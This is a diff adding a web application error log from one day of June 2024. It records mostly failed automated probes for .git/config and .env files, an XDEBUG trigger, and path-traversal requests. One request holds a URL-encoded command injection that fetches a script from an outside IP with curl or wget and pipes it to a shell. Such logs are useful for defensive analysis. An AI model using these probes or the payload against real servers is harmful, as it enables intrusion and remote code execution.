@@ -1,0 +1,78 @@
+---------------------------------------------------------------
+[ 2024-06-19T00:04:24+08:00 ] 20.251.144.86 POST 47.129.4.65/
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-19T05:33:46+08:00 ] 103.233.122.87 GET 47.129.4.65/api/projects?page=1&pageSize=20
+[ error ] controller not exists:app\api\controller\Projects
+---------------------------------------------------------------
+[ 2024-06-19T05:44:46+08:00 ] 83.97.73.245 GET 47.129.4.65:443/?XDEBUG_SESSION_START=phpstorm
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-19T06:03:31+08:00 ] 141.98.11.82 GET 47.129.4.65:443/api/v1/totp/user-backup-code/../../system/system-information
+[ error ] controller not exists:app\api\controller\V1
+---------------------------------------------------------------
+[ 2024-06-19T06:03:31+08:00 ] 141.98.11.82 POST 47.129.4.65:443/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection
+[ error ] controller not exists:app\api\controller\V1
+---------------------------------------------------------------
+[ 2024-06-19T06:03:32+08:00 ] 141.98.11.82 GET 47.129.4.65:443/api/v1/totp/user-backup-code/../../license/keys-status/%3b%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%38%35%2e%31%37%32%2e%31%32%38%2e%39%33%2f%69%76%20%7c%20%73%68%20%7c%7c%20%77%67%65%74%20%2d%4f%2d%20%68%74%74%70%3a%2f%2f%31%38%35%2e%31%37%32%2e%31%32%38%2e%39%33%2f%69%76%20%7c%20%73%68%3b
+[ error ] controller not exists:app\api\controller\V1
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/v1/.git/config
+[ error ] controller not exists:app\api\controller\V1
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/user/v4/.git/config
+[ error ] controller not exists:app\api\controller\User
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/user/v2/.git/config
+[ error ] controller not exists:app\api\controller\User
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/v2/.git/config
+[ error ] controller not exists:app\api\controller\V2
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/admin/v2/.git/config
+[ error ] controller not exists:app\api\controller\Admin
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/admin/v1/.git/config
+[ error ] controller not exists:app\api\controller\Admin
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/user/v3/.git/config
+[ error ] controller not exists:app\api\controller\User
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/.git/config
+[ error ] controller not exists:.git
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/user/v1/.git/config
+[ error ] controller not exists:app\api\controller\User
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/admin/v4/.git/config
+[ error ] controller not exists:app\api\controller\Admin
+---------------------------------------------------------------
+[ 2024-06-19T10:30:15+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/admin/v3/.git/config
+[ error ] controller not exists:app\api\controller\Admin
+---------------------------------------------------------------
+[ 2024-06-19T10:30:16+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/v3/.git/config
+[ error ] controller not exists:app\api\controller\V3
+---------------------------------------------------------------
+[ 2024-06-19T10:30:16+08:00 ] 193.143.1.119 GET kefu7hgshjagskgahsa.site/api/v4/.git/config
+[ error ] controller not exists:app\api\controller\V4
+---------------------------------------------------------------
+[ 2024-06-19T10:39:33+08:00 ] 8.208.10.94 GET 47.129.4.65/?dns=NIcBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-19T10:39:34+08:00 ] 8.208.10.94 GET 47.129.4.65/?name=example.com&type=A
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-19T10:39:34+08:00 ] 8.208.10.94 GET 47.129.4.65/?dns=sqwBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-19T10:39:35+08:00 ] 8.208.10.94 GET 47.129.4.65/?name=example.com&type=A
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-19T18:09:51+08:00 ] 178.215.236.38 POST 47.129.4.65/
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-19T19:33:22+08:00 ] 66.94.111.184 GET 47.129.4.65/api/.env
+[ error ] controller not exists:.env
+---------------------------------------------------------------
+[ 2024-06-19T19:34:04+08:00 ] 66.94.111.184 POST 47.129.4.65/
+[ error ] [8]未定义数组索引: code
